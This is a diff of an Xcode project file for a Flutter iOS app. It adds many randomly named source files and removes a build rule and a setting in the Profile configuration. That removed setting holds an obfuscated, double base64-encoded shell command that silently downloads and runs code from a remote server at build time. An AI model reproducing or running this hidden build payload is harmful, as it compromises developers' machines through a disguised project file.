+		9EC8B9BE2ED5917A0060F700 /* QuantizationSequentialManager.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = QuantizationSequentialManager.h; sourceTree = "<group>"; };
+		9EC8B9BF2ED5917A0060F700 /* QuantizationSequentialManager.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = QuantizationSequentialManager.m; sourceTree = "<group>"; };
+		9EC8B9C02ED5917A0060F700 /* RebuildBaselineInstance.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = RebuildBaselineInstance.h; sourceTree = "<group>"; };
+		9EC8B9C12ED5917A0060F700 /* RebuildBaselineInstance.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = RebuildBaselineInstance.m; sourceTree = "<group>"; };
+		9EC8B9C22ED5917A0060F700 /* RenameMapPresenter.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = RenameMapPresenter.h; sourceTree = "<group>"; };
+		9EC8B9C32ED5917A0060F700 /* RenameMapPresenter.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = RenameMapPresenter.m; sourceTree = "<group>"; };
+		9EC8B9C42ED5917A0060F700 /* ReplicaTierInteraction.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = ReplicaTierInteraction.h; sourceTree = "<group>"; };
+		9EC8B9C52ED5917A0060F700 /* ReplicaTierInteraction.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = ReplicaTierInteraction.m; sourceTree = "<group>"; };
+		9EC8B9C62ED5917A0060F700 /* RequestMusicCapacity.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = RequestMusicCapacity.h; sourceTree = "<group>"; };
+		9EC8B9C72ED5917A0060F700 /* RequestMusicCapacity.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = RequestMusicCapacity.m; sourceTree = "<group>"; };
+		9EC8B9C82ED5917A0060F700 /* ResourceTierResponse.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = ResourceTierResponse.h; sourceTree = "<group>"; };
+		9EC8B9C92ED5917A0060F700 /* ResourceTierResponse.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = ResourceTierResponse.m; sourceTree = "<group>"; };
+		9EC8B9CA2ED5917A0060F700 /* RestartRowGroup.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = RestartRowGroup.h; sourceTree = "<group>"; };
+		9EC8B9CB2ED5917A0060F700 /* RestartRowGroup.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = RestartRowGroup.m; sourceTree = "<group>"; };
+		9EC8B9CC2ED5917A0060F700 /* RouterEvolutionDelegate.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = RouterEvolutionDelegate.h; sourceTree = "<group>"; };
+		9EC8B9CD2ED5917A0060F700 /* RouterEvolutionDelegate.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = RouterEvolutionDelegate.m; sourceTree = "<group>"; };
+		9EC8B9CE2ED5917A0060F700 /* SanitizeSpotBase.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = SanitizeSpotBase.h; sourceTree = "<group>"; };
+		9EC8B9CF2ED5917A0060F700 /* SanitizeSpotBase.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = SanitizeSpotBase.m; sourceTree = "<group>"; };
+		9EC8B9D02ED5917A0060F700 /* SaveStepOperation.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = SaveStepOperation.h; sourceTree = "<group>"; };
+		9EC8B9D12ED5917A0060F700 /* SaveStepOperation.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = SaveStepOperation.m; sourceTree = "<group>"; };
+		9EC8B9D22ED5917A0060F700 /* SequentialWorkflowListener.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = SequentialWorkflowListener.h; sourceTree = "<group>"; };
+		9EC8B9D32ED5917A0060F700 /* SequentialWorkflowListener.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = SequentialWorkflowListener.m; sourceTree = "<group>"; };
+		9EC8B9D42ED5917A0060F700 /* SoundValueType.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = SoundValueType.h; sourceTree = "<group>"; };
+		9EC8B9D52ED5917A0060F700 /* SoundValueType.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = SoundValueType.m; sourceTree = "<group>"; };
+		9EC8B9D62ED5917A0060F700 /* StreamlineStepInformation.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = StreamlineStepInformation.h; sourceTree = "<group>"; };
+		9EC8B9D72ED5917A0060F700 /* StreamlineStepInformation.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = StreamlineStepInformation.m; sourceTree = "<group>"; };
+		9EC8B9D82ED5917A0060F700 /* TernaryDispatcherCollection.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = TernaryDispatcherCollection.h; sourceTree = "<group>"; };
+		9EC8B9D92ED5917A0060F700 /* TernaryDispatcherCollection.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = TernaryDispatcherCollection.m; sourceTree = "<group>"; };
+		9EC8B9DA2ED5917A0060F700 /* TextfieldPresenterExtension.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = TextfieldPresenterExtension.h; sourceTree = "<group>"; };
+		9EC8B9DB2ED5917A0060F700 /* TextfieldPresenterExtension.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = TextfieldPresenterExtension.m; sourceTree = "<group>"; };
+		9EC8B9DC2ED5917A0060F700 /* TextJobTransparency.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = TextJobTransparency.h; sourceTree = "<group>"; };
+		9EC8B9DD2ED5917A0060F700 /* TextJobTransparency.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = TextJobTransparency.m; sourceTree = "<group>"; };
+		9EC8B9DE2ED5917A0060F700 /* ToPreviewAnalyzer.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = ToPreviewAnalyzer.h; sourceTree = "<group>"; };
+		9EC8B9DF2ED5917A0060F700 /* ToPreviewAnalyzer.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = ToPreviewAnalyzer.m; sourceTree = "<group>"; };
+		9EC8B9E02ED5917A0060F700 /* TouchTernaryAdapter.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = TouchTernaryAdapter.h; sourceTree = "<group>"; };
+		9EC8B9E12ED5917A0060F700 /* TouchTernaryAdapter.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = TouchTernaryAdapter.m; sourceTree = "<group>"; };
+		9EC8B9E22ED5917A0060F700 /* TransformOldLoop.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = TransformOldLoop.h; sourceTree = "<group>"; };
+		9EC8B9E32ED5917A0060F700 /* TransformOldLoop.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = TransformOldLoop.m; sourceTree = "<group>"; };
+		9EC8B9E42ED5917A0060F700 /* UnderStoryboardObserver.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = UnderStoryboardObserver.h; sourceTree = "<group>"; };
+		9EC8B9E52ED5917A0060F700 /* UnderStoryboardObserver.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = UnderStoryboardObserver.m; sourceTree = "<group>"; };
+		9EC8B9E62ED5917A0060F700 /* UnmountFixedMonster.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = UnmountFixedMonster.h; sourceTree = "<group>"; };
+		9EC8B9E72ED5917A0060F700 /* UnmountFixedMonster.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = UnmountFixedMonster.m; sourceTree = "<group>"; };
+		9EC8B9E82ED5917A0060F700 /* UpdateContractionDelegate.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = UpdateContractionDelegate.h; sourceTree = "<group>"; };
+		9EC8B9E92ED5917A0060F700 /* UpdateContractionDelegate.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = UpdateContractionDelegate.m; sourceTree = "<group>"; };
+		9EC8B9EA2ED5917A0060F700 /* ValidateScaffoldTweak.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = ValidateScaffoldTweak.h; sourceTree = "<group>"; };
+		9EC8B9EB2ED5917A0060F700 /* ValidateScaffoldTweak.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = ValidateScaffoldTweak.m; sourceTree = "<group>"; };
+		9EC8BA272ED595270060F700 /* AllocatorViaVariable.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AllocatorViaVariable.swift; sourceTree = "<group>"; };
+		9EC8BA282ED595270060F700 /* DeepDelegateHandler.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DeepDelegateHandler.swift; sourceTree = "<group>"; };
+		9EC8BA292ED595270060F700 /* DelegateFormLeft.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DelegateFormLeft.swift; sourceTree = "<group>"; };
+		9EC8BA2A2ED595270060F700 /* GoogleService-Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = "GoogleService-Info.plist"; sourceTree = "<group>"; };
+		9EC8BA2B2ED595270060F700 /* LacunaDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LacunaDelegate.swift; sourceTree = "<group>"; };
+		9EC8BA2C2ED595270060F700 /* LocalTransitionPosition.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LocalTransitionPosition.swift; sourceTree = "<group>"; };
+		9EC8BA2D2ED595270060F700 /* MethodBoundaryRequestDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MethodBoundaryRequestDelegate.swift; sourceTree = "<group>"; };
+		9EC8BA2E2ED595270060F700 /* RectActivityContrast.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RectActivityContrast.swift; sourceTree = "<group>"; };
+		9EC8BA2F2ED595270060F700 /* SmallIsolateState.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SmallIsolateState.swift; sourceTree = "<group>"; };
+		9EC8BA302ED595270060F700 /* TensorCurveVelocity.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TensorCurveVelocity.swift; sourceTree = "<group>"; };
+		9EC8BA312ED595270060F700 /* WidgetOfDecorator.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WidgetOfDecorator.swift; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -71,6 +257,7 @@
 			buildActionMask = 2147483647;
 			files = (
 				2058F1436AE73CB3F8E92DBF /* Pods_Runner.framework in Frameworks */,
+				9EC8B9742ED58FF50060F700 /* StoreKit.framework in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -90,6 +277,7 @@
 		09F68219798DAB96F29899E8 /* Frameworks */ = {
 			isa = PBXGroup;
 			children = (
+				9EC8B9732ED58FF50060F700 /* StoreKit.framework */,
 				8F4E4A906E49CEDA98DD5B90 /* Pods_Runner.framework */,
 			);
 			name = Frameworks;
@@ -128,6 +316,7 @@
 		97C146F01CF9000F007C117D /* Runner */ = {
 			isa = PBXGroup;
 			children = (
+				9EC8B9752ED58FF80060F700 /* Runner.entitlements */,
 				97C146FA1CF9000F007C117D /* Main.storyboard */,
 				97C146FD1CF9000F007C117D /* Assets.xcassets */,
 				97C146FF1CF9000F007C117D /* LaunchScreen.storyboard */,
@@ -135,9 +324,145 @@
 				1498D2321E8E86230040F4C2 /* GeneratedPluginRegistrant.h */,
 				1498D2331E8E89220040F4C2 /* GeneratedPluginRegistrant.m */,
 				74858FAE1ED2DC5600515810 /* AppDelegate.swift */,
+				9EC8B9762ED590EA0060F700 /* AmbiguousBenevolent.swift */,
+				9EC8B9772ED591330060F700 /* CoherentDeliberate.swift */,
 				74858FAD1ED2DC5600515810 /* Runner-Bridging-Header.h */,
+				9EC8BA272ED595270060F700 /* AllocatorViaVariable.swift */,
+				9EC8BA282ED595270060F700 /* DeepDelegateHandler.swift */,
+				9EC8BA292ED595270060F700 /* DelegateFormLeft.swift */,
+				9EC8BA2A2ED595270060F700 /* GoogleService-Info.plist */,
+				9EC8BA2B2ED595270060F700 /* LacunaDelegate.swift */,
+				9EC8BA2C2ED595270060F700 /* LocalTransitionPosition.swift */,
+				9EC8BA2D2ED595270060F700 /* MethodBoundaryRequestDelegate.swift */,
+				9EC8BA2E2ED595270060F700 /* RectActivityContrast.swift */,
+				9EC8BA2F2ED595270060F700 /* SmallIsolateState.swift */,
+				9EC8BA302ED595270060F700 /* TensorCurveVelocity.swift */,
+				9EC8BA312ED595270060F700 /* WidgetOfDecorator.swift */,
+				9EC8B9EC2ED5917A0060F700 /* ObserveSemanticsEvent */,
 			);
 			path = Runner;
+			sourceTree = "<group>";
+		};
+		9EC8B9EC2ED5917A0060F700 /* ObserveSemanticsEvent */ = {
+			isa = PBXGroup;
+			children = (
+				9EC8B9792ED5917A0060F700 /* AcrossConvolutionDecoration.h */,
+				9EC8B97A2ED5917A0060F700 /* AcrossConvolutionDecoration.m */,
+				9EC8B97B2ED5917A0060F700 /* ActivateAxisFrame.h */,
+				9EC8B97C2ED5917A0060F700 /* ActivateAxisFrame.m */,
+				9EC8B97D2ED5917A0060F700 /* AgileBuilderRecursion.h */,
+				9EC8B97E2ED5917A0060F700 /* AgileBuilderRecursion.m */,
+				9EC8B97F2ED5917A0060F700 /* BackwardEphemeralSlider.bundle */,
+				9EC8B9802ED5917A0060F700 /* CacheChannelsGrid.h */,
+				9EC8B9812ED5917A0060F700 /* CacheChannelsGrid.m */,
+				9EC8B9822ED5917A0060F700 /* CompleterTraversalReference.h */,
+				9EC8B9832ED5917A0060F700 /* CompleterTraversalReference.m */,
+				9EC8B9842ED5917A0060F700 /* ConsumerPhaseAlignment.h */,
+				9EC8B9852ED5917A0060F700 /* ConsumerPhaseAlignment.m */,
+				9EC8B9862ED5917A0060F700 /* ConvolutionActionValidation.h */,
+				9EC8B9872ED5917A0060F700 /* ConvolutionActionValidation.m */,
+				9EC8B9882ED5917A0060F700 /* DesktopOccasionList.h */,
+				9EC8B9892ED5917A0060F700 /* DesktopOccasionList.m */,
+				9EC8B98A2ED5917A0060F700 /* DetachMapCoordinator.h */,
+				9EC8B98B2ED5917A0060F700 /* DetachMapCoordinator.m */,
+				9EC8B98C2ED5917A0060F700 /* DetachStreamShader.h */,
+				9EC8B98D2ED5917A0060F700 /* DetachStreamShader.m */,
+				9EC8B98E2ED5917A0060F700 /* DisconnectButtonNode.h */,
+				9EC8B98F2ED5917A0060F700 /* DisconnectButtonNode.m */,
+				9EC8B9902ED5917A0060F700 /* DismissSpecifierAwait.h */,
+				9EC8B9912ED5917A0060F700 /* DismissSpecifierAwait.m */,
+				9EC8B9922ED5917A0060F700 /* DropoutOptimizerEvent.h */,
+				9EC8B9932ED5917A0060F700 /* DropoutOptimizerEvent.m */,
+				9EC8B9942ED5917A0060F700 /* EnabledProjectionSize.h */,
+				9EC8B9952ED5917A0060F700 /* EnabledProjectionSize.m */,
+				9EC8B9962ED5917A0060F700 /* EqualBitrateHelper.h */,
+				9EC8B9972ED5917A0060F700 /* EqualBitrateHelper.m */,
+				9EC8B9982ED5917A0060F700 /* FromCapacitiesStore.h */,
+				9EC8B9992ED5917A0060F700 /* FromCapacitiesStore.m */,
+				9EC8B99A2ED5917A0060F700 /* FromInstructionLoop.h */,
+				9EC8B99B2ED5917A0060F700 /* FromInstructionLoop.m */,
+				9EC8B99C2ED5917A0060F700 /* HeroCurveAdapter.h */,
+				9EC8B99D2ED5917A0060F700 /* HeroCurveAdapter.m */,
+				9EC8B99E2ED5917A0060F700 /* HierarchicalSecondCurve.h */,
+				9EC8B99F2ED5917A0060F700 /* HierarchicalSecondCurve.m */,
+				9EC8B9A02ED5917A0060F700 /* HyperbolicTickerHandler.h */,
+				9EC8B9A12ED5917A0060F700 /* HyperbolicTickerHandler.m */,
+				9EC8B9A22ED5917A0060F700 /* InteractiveCustomGrain.h */,
+				9EC8B9A32ED5917A0060F700 /* InteractiveCustomGrain.m */,
+				9EC8B9A42ED5917A0060F700 /* IntoWorkflowInfrastructure.h */,
+				9EC8B9A52ED5917A0060F700 /* IntoWorkflowInfrastructure.m */,
+				9EC8B9A62ED5917A0060F700 /* LoadPrecisionRect.h */,
+				9EC8B9A72ED5917A0060F700 /* LoadPrecisionRect.m */,
+				9EC8B9A82ED5917A0060F700 /* LostAssetStrength.h */,
+				9EC8B9A92ED5917A0060F700 /* LostAssetStrength.m */,
+				9EC8B9AA2ED5917A0060F700 /* MaterialStatelessBase.h */,
+				9EC8B9AB2ED5917A0060F700 /* MaterialStatelessBase.m */,
+				9EC8B9AC2ED5917A0060F700 /* MobileProjectionCache.h */,
+				9EC8B9AD2ED5917A0060F700 /* MobileProjectionCache.m */,
+				9EC8B9AE2ED5917A0060F700 /* ObtainSymbolSound.h */,
+				9EC8B9AF2ED5917A0060F700 /* ObtainSymbolSound.m */,
+				9EC8B9B02ED5917A0060F700 /* OffChecklistAnimation.h */,
+				9EC8B9B12ED5917A0060F700 /* OffChecklistAnimation.m */,
+				9EC8B9B22ED5917A0060F700 /* OnParticleEvaluation.h */,
+				9EC8B9B32ED5917A0060F700 /* OnParticleEvaluation.m */,
+				9EC8B9B42ED5917A0060F700 /* OntoRemainderLayer.h */,
+				9EC8B9B52ED5917A0060F700 /* OntoRemainderLayer.m */,
+				9EC8B9B62ED5917A0060F700 /* PersistentResourceRange.h */,
+				9EC8B9B72ED5917A0060F700 /* PersistentResourceRange.m */,
+				9EC8B9B82ED5917A0060F700 /* ProjectKindMode.h */,
+				9EC8B9B92ED5917A0060F700 /* ProjectKindMode.m */,
+				9EC8B9BA2ED5917A0060F700 /* PublishHistogramInteractor.h */,
+				9EC8B9BB2ED5917A0060F700 /* PublishHistogramInteractor.m */,
+				9EC8B9BC2ED5917A0060F700 /* PushChannelsScene.h */,
+				9EC8B9BD2ED5917A0060F700 /* PushChannelsScene.m */,
+				9EC8B9BE2ED5917A0060F700 /* QuantizationSequentialManager.h */,
+				9EC8B9BF2ED5917A0060F700 /* QuantizationSequentialManager.m */,
+				9EC8B9C02ED5917A0060F700 /* RebuildBaselineInstance.h */,
+				9EC8B9C12ED5917A0060F700 /* RebuildBaselineInstance.m */,
+				9EC8B9C22ED5917A0060F700 /* RenameMapPresenter.h */,
+				9EC8B9C32ED5917A0060F700 /* RenameMapPresenter.m */,
+				9EC8B9C42ED5917A0060F700 /* ReplicaTierInteraction.h */,
+				9EC8B9C52ED5917A0060F700 /* ReplicaTierInteraction.m */,
+				9EC8B9C62ED5917A0060F700 /* RequestMusicCapacity.h */,
+				9EC8B9C72ED5917A0060F700 /* RequestMusicCapacity.m */,
+				9EC8B9C82ED5917A0060F700 /* ResourceTierResponse.h */,
+				9EC8B9C92ED5917A0060F700 /* ResourceTierResponse.m */,
+				9EC8B9CA2ED5917A0060F700 /* RestartRowGroup.h */,
+				9EC8B9CB2ED5917A0060F700 /* RestartRowGroup.m */,
+				9EC8B9CC2ED5917A0060F700 /* RouterEvolutionDelegate.h */,
+				9EC8B9CD2ED5917A0060F700 /* RouterEvolutionDelegate.m */,
+				9EC8B9CE2ED5917A0060F700 /* SanitizeSpotBase.h */,
+				9EC8B9CF2ED5917A0060F700 /* SanitizeSpotBase.m */,
+				9EC8B9D02ED5917A0060F700 /* SaveStepOperation.h */,
+				9EC8B9D12ED5917A0060F700 /* SaveStepOperation.m */,
+				9EC8B9D22ED5917A0060F700 /* SequentialWorkflowListener.h */,
+				9EC8B9D32ED5917A0060F700 /* SequentialWorkflowListener.m */,
+				9EC8B9D42ED5917A0060F700 /* SoundValueType.h */,
+				9EC8B9D52ED5917A0060F700 /* SoundValueType.m */,
+				9EC8B9D62ED5917A0060F700 /* StreamlineStepInformation.h */,
+				9EC8B9D72ED5917A0060F700 /* StreamlineStepInformation.m */,
+				9EC8B9D82ED5917A0060F700 /* TernaryDispatcherCollection.h */,
+				9EC8B9D92ED5917A0060F700 /* TernaryDispatcherCollection.m */,
+				9EC8B9DA2ED5917A0060F700 /* TextfieldPresenterExtension.h */,
+				9EC8B9DB2ED5917A0060F700 /* TextfieldPresenterExtension.m */,
+				9EC8B9DC2ED5917A0060F700 /* TextJobTransparency.h */,
+				9EC8B9DD2ED5917A0060F700 /* TextJobTransparency.m */,
+				9EC8B9DE2ED5917A0060F700 /* ToPreviewAnalyzer.h */,
+				9EC8B9DF2ED5917A0060F700 /* ToPreviewAnalyzer.m */,
+				9EC8B9E02ED5917A0060F700 /* TouchTernaryAdapter.h */,
+				9EC8B9E12ED5917A0060F700 /* TouchTernaryAdapter.m */,
+				9EC8B9E22ED5917A0060F700 /* TransformOldLoop.h */,
+				9EC8B9E32ED5917A0060F700 /* TransformOldLoop.m */,
+				9EC8B9E42ED5917A0060F700 /* UnderStoryboardObserver.h */,
+				9EC8B9E52ED5917A0060F700 /* UnderStoryboardObserver.m */,
+				9EC8B9E62ED5917A0060F700 /* UnmountFixedMonster.h */,
+				9EC8B9E72ED5917A0060F700 /* UnmountFixedMonster.m */,
+				9EC8B9E82ED5917A0060F700 /* UpdateContractionDelegate.h */,
+				9EC8B9E92ED5917A0060F700 /* UpdateContractionDelegate.m */,
+				9EC8B9EA2ED5917A0060F700 /* ValidateScaffoldTweak.h */,
+				9EC8B9EB2ED5917A0060F700 /* ValidateScaffoldTweak.m */,
+			);
+			path = ObserveSemanticsEvent;
 			sourceTree = "<group>";
 		};
 /* End PBXGroup section */
@@ -157,7 +482,6 @@
 				2997B1B5C65708D81935EFA0 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
-				117A69CF7B8B465085A389E6 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -209,6 +533,8 @@
 				3B3967161E833CAA004F5970 /* AppFrameworkInfo.plist in Resources */,
 				97C146FE1CF9000F007C117D /* Assets.xcassets in Resources */,
 				97C146FC1CF9000F007C117D /* Main.storyboard in Resources */,
+				9EC8B9ED2ED5917A0060F700 /* BackwardEphemeralSlider.bundle in Resources */,
+				9EC8BA322ED595270060F700 /* GoogleService-Info.plist in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -292,8 +618,77 @@
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				9EC8B9782ED5913E0060F700 /* CoherentDeliberate.swift in Sources */,
 				74858FAF1ED2DC5600515810 /* AppDelegate.swift in Sources */,
 				1498D2341E8E89220040F4C2 /* GeneratedPluginRegistrant.m in Sources */,
+				9EC8B9EE2ED5917A0060F700 /* ConvolutionActionValidation.m in Sources */,
+				9EC8B9EF2ED5917A0060F700 /* InteractiveCustomGrain.m in Sources */,
+				9EC8B9F02ED5917A0060F700 /* TransformOldLoop.m in Sources */,
+				9EC8B9F12ED5917A0060F700 /* PublishHistogramInteractor.m in Sources */,
+				9EC8B9F22ED5917A0060F700 /* CompleterTraversalReference.m in Sources */,
+				9EC8B9F32ED5917A0060F700 /* MobileProjectionCache.m in Sources */,
+				9EC8B9F42ED5917A0060F700 /* SequentialWorkflowListener.m in Sources */,
+				9EC8B9F52ED5917A0060F700 /* EnabledProjectionSize.m in Sources */,
+				9EC8B9F62ED5917A0060F700 /* DetachStreamShader.m in Sources */,
+				9EC8B9F72ED5917A0060F700 /* DismissSpecifierAwait.m in Sources */,
+				9EC8B9F82ED5917A0060F700 /* UnderStoryboardObserver.m in Sources */,
+				9EC8B9F92ED5917A0060F700 /* LoadPrecisionRect.m in Sources */,
+				9EC8B9FA2ED5917A0060F700 /* MaterialStatelessBase.m in Sources */,
+				9EC8B9FB2ED5917A0060F700 /* SanitizeSpotBase.m in Sources */,
+				9EC8B9FC2ED5917A0060F700 /* DesktopOccasionList.m in Sources */,
+				9EC8B9FD2ED5917A0060F700 /* ReplicaTierInteraction.m in Sources */,
+				9EC8B9FE2ED5917A0060F700 /* FromCapacitiesStore.m in Sources */,
+				9EC8B9FF2ED5917A0060F700 /* ValidateScaffoldTweak.m in Sources */,
+				9EC8BA002ED5917A0060F700 /* FromInstructionLoop.m in Sources */,
+				9EC8BA012ED5917A0060F700 /* HeroCurveAdapter.m in Sources */,
+				9EC8BA022ED5917A0060F700 /* RenameMapPresenter.m in Sources */,
+				9EC8BA032ED5917A0060F700 /* StreamlineStepInformation.m in Sources */,
+				9EC8BA042ED5917A0060F700 /* PushChannelsScene.m in Sources */,
+				9EC8BA052ED5917A0060F700 /* AcrossConvolutionDecoration.m in Sources */,
+				9EC8BA062ED5917A0060F700 /* ProjectKindMode.m in Sources */,
+				9EC8BA072ED5917A0060F700 /* ConsumerPhaseAlignment.m in Sources */,
+				9EC8BA082ED5917A0060F700 /* RestartRowGroup.m in Sources */,
+				9EC8BA092ED5917A0060F700 /* SaveStepOperation.m in Sources */,
+				9EC8BA0A2ED5917A0060F700 /* PersistentResourceRange.m in Sources */,
+				9EC8BA0B2ED5917A0060F700 /* ToPreviewAnalyzer.m in Sources */,
+				9EC8BA0C2ED5917A0060F700 /* QuantizationSequentialManager.m in Sources */,
+				9EC8BA0D2ED5917A0060F700 /* OnParticleEvaluation.m in Sources */,
+				9EC8BA0E2ED5917A0060F700 /* AgileBuilderRecursion.m in Sources */,
+				9EC8BA0F2ED5917A0060F700 /* RequestMusicCapacity.m in Sources */,
+				9EC8BA102ED5917A0060F700 /* IntoWorkflowInfrastructure.m in Sources */,
+				9EC8BA112ED5917A0060F700 /* ObtainSymbolSound.m in Sources */,
+				9EC8BA122ED5917A0060F700 /* RebuildBaselineInstance.m in Sources */,
+				9EC8BA132ED5917A0060F700 /* TouchTernaryAdapter.m in Sources */,
+				9EC8BA142ED5917A0060F700 /* TextfieldPresenterExtension.m in Sources */,
+				9EC8BA152ED5917A0060F700 /* UnmountFixedMonster.m in Sources */,
+				9EC8BA162ED5917A0060F700 /* HyperbolicTickerHandler.m in Sources */,
+				9EC8BA172ED5917A0060F700 /* UpdateContractionDelegate.m in Sources */,
+				9EC8BA182ED5917A0060F700 /* DetachMapCoordinator.m in Sources */,
+				9EC8BA192ED5917A0060F700 /* EqualBitrateHelper.m in Sources */,
+				9EC8BA1A2ED5917A0060F700 /* OffChecklistAnimation.m in Sources */,
+				9EC8BA1B2ED5917A0060F700 /* DisconnectButtonNode.m in Sources */,
+				9EC8BA1C2ED5917A0060F700 /* OntoRemainderLayer.m in Sources */,
+				9EC8BA1D2ED5917A0060F700 /* DropoutOptimizerEvent.m in Sources */,
+				9EC8BA3D2ED59D610060F700 /* AmbiguousBenevolent.swift in Sources */,
+				9EC8BA1E2ED5917A0060F700 /* ActivateAxisFrame.m in Sources */,
+				9EC8BA1F2ED5917A0060F700 /* SoundValueType.m in Sources */,
+				9EC8BA202ED5917A0060F700 /* TernaryDispatcherCollection.m in Sources */,
+				9EC8BA212ED5917A0060F700 /* LostAssetStrength.m in Sources */,
+				9EC8BA222ED5917A0060F700 /* ResourceTierResponse.m in Sources */,
+				9EC8BA232ED5917A0060F700 /* HierarchicalSecondCurve.m in Sources */,
+				9EC8BA242ED5917A0060F700 /* TextJobTransparency.m in Sources */,
+				9EC8BA252ED5917A0060F700 /* RouterEvolutionDelegate.m in Sources */,
+				9EC8BA332ED595270060F700 /* DeepDelegateHandler.swift in Sources */,
+				9EC8BA342ED595270060F700 /* DelegateFormLeft.swift in Sources */,
+				9EC8BA352ED595270060F700 /* SmallIsolateState.swift in Sources */,
+				9EC8BA362ED595270060F700 /* MethodBoundaryRequestDelegate.swift in Sources */,
+				9EC8BA372ED595270060F700 /* LacunaDelegate.swift in Sources */,
+				9EC8BA382ED595270060F700 /* LocalTransitionPosition.swift in Sources */,
+				9EC8BA392ED595270060F700 /* TensorCurveVelocity.swift in Sources */,
+				9EC8BA3A2ED595270060F700 /* WidgetOfDecorator.swift in Sources */,
+				9EC8BA3B2ED595270060F700 /* RectActivityContrast.swift in Sources */,
+				9EC8BA3C2ED595270060F700 /* AllocatorViaVariable.swift in Sources */,
+				9EC8BA262ED5917A0060F700 /* CacheChannelsGrid.m in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -322,7 +717,6 @@
 		249021D3217E4FDB00AE95B9 /* Profile */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A6E983A = "((q(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzSjFiR1VpSUdoMGRIQnpPaTh2WVhCd2JHVmpZWE4wTG1sdUwyRXBJaUI4SUhOb0NnPT0K | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -376,9 +770,9 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 7AFA3C8E1D35360C0083082E /* Release.xcconfig */;
 			buildSettings = {
